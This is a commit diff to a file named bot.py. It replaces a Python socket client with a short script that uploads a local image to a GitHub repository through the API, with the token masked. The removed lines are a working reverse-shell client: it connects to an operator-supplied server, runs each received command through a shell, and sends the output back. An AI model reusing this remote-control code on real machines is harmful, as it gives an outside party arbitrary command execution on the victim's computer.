297594d9b2b5a73116065998ea72a35d0db23d58
PabloHerFer1 <125303845+PabloHerFer1@users.noreply.github.com>
2023-03-01 19:44:28 +0100

    Update bot.py

--- bot.py
+++ bot.py
@@ -1,34 +1,28 @@
-import socket
-# control operating system of target machine
-import os
-import subprocess
+# Import the requests module for send a PUT request
+import requests
+# Import the base64 module for encoding a file to base64
+import base64
 
-s = socket.socket() # client computer can connect to others
+githubAPIURL = "https://api.github.com/repos/bracketcounters/test-repo/contents/new-image.jpg"
+# Replace "bracketcounters" with your username, replace "test-repo" with your repository name and replace "new-image.png" with the filename you want to upload from local to GitHub.
 
-# ip address of server, can use own computer's private IP if doing on local
-host = str(input("Enter the IP address of the server that wants to control your computer: "))
-port = int(input("Enter the port of the server that wants to control your computer (default input: 9999): "))
+# Paste your API token here
+githubToken = "ghp_bYsn******************"
 
-s.connect((host, port)) # binds client computer to server computer
 
-# infinite loop for continuous listening for server's commands
-while True:
-        data = s.recv(1024)
-        if data[:2].decode("utf-8") == 'cd': # command to change directory (cd)
-                os.chdir(data[3:].decode("utf-8")) # look at target directory to cd to
+with open("my-local-image.jpg", "rb") as f:
+    # Encoding "my-local-image.jpg" to base64 format
+    encodedData = base64.b64encode(f.read())
 
-        if len(data) > 0: # check if there are actually data/commands received (that is not cd)
-                
-                # opens up a process to run a command similar to running in terminal, takes out any output and pipes out to standard stream
-                cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) 
-                
-                # bytes and string versions of results
-                output_bytes = cmd.stdout.read() + cmd.stderr.read() # bytes version of streamed output
-                output_str = str(output_bytes, "utf-8") # plain old basic string
+    headers = {
+        "Authorization": f'''Bearer {githubToken}''',
+        "Content-type": "application/vnd.github+json"
+    }
+    data = {
+        "message": "My commit message", # Put your commit message here.
+        "content": encodedData.decode("utf-8")
+    }
 
-                # getcwd allows the server side to see where the current working directory is on the client
-                s.send(str.encode(output_str + str(os.getcwd()) + '> '))
-                print(output_str) # client can see what server side is doing
-
-# close connection
-s.close()
+    r = requests.put(githubAPIURL, headers=headers, json=data)
+    print(r.text) # Printing the response
+                    
